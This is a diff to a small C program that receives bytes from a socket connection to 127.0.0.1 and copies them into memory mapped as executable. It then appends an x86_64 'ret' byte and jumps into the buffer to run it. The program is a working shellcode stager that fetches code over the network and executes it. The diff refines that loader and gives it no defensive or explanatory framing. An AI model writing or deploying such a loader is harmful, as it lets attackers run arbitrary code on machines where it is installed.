@@ -8,7 +8,7 @@
 #include <sys/mman.h>
 
 const char *IP = "127.0.0.1";
-const int PORT = 13981;
+const int PORT = 15213;
 
 int main() {
   const char *server_ip = IP;
@@ -45,25 +45,19 @@ int main() {
     return EXIT_FAILURE;
   }
 
-  size_t length = sizeof(buffer);
+  unsigned char *memory = mmap(NULL, bytes_recv + 1, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
-  unsigned char *memory = mmap(NULL, length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-
-  printf("%s", "HELLO");
-
-  for (int i = 0; i < length; i++) {
-    if (buffer[i] == 0) {
-      printf("%x", buffer[i]);
-      break;      
-    }
+  for (int i = 0; i < bytes_recv; i++) {
     memory[i] = buffer[i];
   }
+
+  memory[bytes_recv] = 0xC3; // x86_64 ret instruction
 
   int (*ret)() = (int (*)())memory;
 
   ret();
 
-  munmap(memory, length);
+  munmap(memory, bytes_recv);
 
   close(sock);
 
